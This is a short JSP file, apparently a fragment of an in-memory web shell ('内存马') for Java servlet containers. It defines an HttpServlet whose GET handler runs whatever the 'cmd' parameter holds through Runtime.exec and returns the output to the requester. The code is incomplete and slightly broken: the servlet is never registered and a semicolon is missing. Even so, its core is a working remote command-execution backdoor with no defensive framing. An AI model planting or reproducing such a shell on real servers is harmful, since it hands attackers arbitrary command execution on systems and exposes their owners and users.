<% page contentType="text/html;charset=UTF-8" language="java"%>
<html>
    <head>
        <title>
            $Servlet内存马创建$
        </title>
        <body>
        <%
            HttpServlet httpServlet = new HttpServlet() {
                @Override
                protected void doGet(HttpServletRequest req,HttpServletResponse resp) throws ServletException,IOException{
                    InputStream ins = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
                    BufferedInputStream bins = new BufferedInputStream(ins);

                    int len;
                    while ((len = bins.read()) != -1) {
                        resp.getWriter().write(len);
                    }
                }
                protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
                    super.doPost(req, resp);
                }
            }
        %>
        </body>
    </head>
</html>